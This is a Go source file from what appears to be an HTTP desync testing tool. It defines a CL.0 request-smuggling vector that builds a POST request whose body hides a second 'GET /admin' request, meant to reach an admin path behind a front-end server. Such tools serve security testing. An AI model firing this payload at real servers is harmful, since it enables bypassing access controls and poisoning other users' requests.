package vectors

import (
	"github.com/byteoverride/desynctrace/internal/client"
)

type CL0Vector struct{}

func NewCL0Vector() *CL0Vector {
	return &CL0Vector{}
}

func (v *CL0Vector) Name() string {
	return "CL.0 (Front-end uses CL, Back-end ignores body)"
}

func (v *CL0Vector) Type() VectorType {
	return "CL.0"
}

func (v *CL0Vector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	// CL.0
	// Frontend sees Content-Length and forwards body.
	// Backend ignores Content-Length or thinks it's 0, so it leaves body in buffer.
	// Body acts as prefix for next request.

	smuggled := "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"

	req1 := &client.Request{
		Method: "POST",
		URL:    baseReq.URL,
		Headers: map[string]string{
			"Connection": "keep-alive",
		},
		ContentLength: int64(len(smuggled)),
		Body:          []byte(smuggled),
	}

	payloads = append(payloads, req1)
	return payloads
}

func (v *CL0Vector) Verify(resp *client.Response) bool {
	// Usually proven by response poisoning of the *next* request
	return false
}
